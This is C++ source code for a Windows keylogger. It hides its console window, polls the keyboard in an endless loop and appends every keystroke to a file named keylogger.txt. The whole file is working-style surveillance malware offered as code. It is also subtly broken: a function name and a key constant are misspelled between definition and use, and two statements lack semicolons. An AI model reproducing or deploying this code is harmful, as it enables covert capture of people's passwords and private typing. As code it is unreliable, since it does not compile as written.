#include <iostream>
#include <fstream>
#include <bits/stdc++.h>
#include <windows.h> 
// Log file path
#define LOG_FILE "keylogger.txt"

//Save data into log file
void saveData(std::string data) {
	std::fstream logFile;
	
	// Open file
	//std::ios::app will make the new data append to the file instead of erase file content
	// and then write to it
	logFile.open(LOG_FILE, std::ios::app);
	
	// Write data into log file
	logFile << data;

	// Close file strean
	logFile.close();
}

// Translate spacial key int into string
std::string translateSpacialKey(int Key) {
	std::string result;
	char space = (char)VK_SPACE;
	switch (Key)
	{
	case VK_SPACE:
		// Space key
		result = " ";
		break;
        case VK_RETURN:
	        // New line or enter key
	        result = "\n";
        	break;
        case VK_BACK:
	        // BackSpace key
        	result = "\b";
	        break;
        case VK_CAPITAL:
        	// CAPSLOCK key
	        result = "[CAPS_LOCK]";
        	break;
         case VK_SHIFT:
        	// Shıft key
	        result = "[SHIFT]";
        	break;
         case VK_TAB:
                // TAB key
                result = "[TAB]";
                break;
         case VK_CONTROL:
                //  key
                result = "[CTRL]";
                break;

	default:
		break;
	}
	
	return result;
}
int main() {
	int specialKeyArray[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB, VK_CONTROL, VK_MENU, VK_CAPTIAL};
	std::string specialKeyChar;
	bool isSpecialKey;

	
	// Hide terminal window
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE)

	// Loop forever
	while (true) {
	// loop through each key
	for (int key = 8; key <= 190; key++) {
		//check key is pressed
		if (GetAsyncKeyState(key) == -32767) {
		// Key is pressed
		//Check if key is spacial key
		isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray), key) != std::end(specialKeyArray);
		if (isSpecialKey) {
			// This is a special key. We need to translate it!
			specialKeyChar = translateSpecialKey(key);
			// Save data
			saveData(specialKeyChar);
		} else {
			// This is not a special key. We need to check if it is uppercase or lowercase
			if (GetKeyState(VK_CAPITAL)) {
				// CAPSLOCK is on
				saveData(std::string(1, (char)key))
			} else {
				// CAPSLOCK is off
				// Turn the character into lowercase before save
				saveData(std::string(1, (char)std::tolower(key)));
			}
		}
		}
	}
	
	}
	return 0;
}
